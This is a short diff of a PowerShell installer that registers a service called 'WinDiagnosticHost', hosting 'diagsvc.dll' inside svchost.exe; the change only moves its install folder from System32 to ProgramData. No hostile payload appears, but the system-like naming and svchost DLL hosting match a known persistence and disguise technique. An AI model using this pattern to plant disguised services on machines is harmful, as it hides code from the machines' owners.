@@ -13,7 +13,9 @@ function Write-Warn { param([string]$Message) Write-Host ("[WARN] {0}" -f $Messa
 function Write-Err  { param([string]$Message) Write-Host ("[ERR ] {0}" -f $Message) -ForegroundColor Red }
 
 $serviceName = "WinDiagnosticHost"
-$installDir  = Join-Path $env:SystemRoot "System32\DiagnosticHost"
+$programData = [Environment]::GetFolderPath('CommonApplicationData')
+if (-not $programData) { $programData = Join-Path $env:SystemRoot 'ProgramData' }
+$installDir  = Join-Path $programData "DiagnosticHost"
 $dllTarget   = Join-Path $installDir "diagsvc.dll"
 $svchostExe  = "%SystemRoot%\System32\svchost.exe"
 
@@ -76,4 +78,3 @@ if ($svcDetails.ProcessId) {
 }
 
 Write-Info "Run audit_and_debug_svchost.ps1 to verify deeper integration."
-
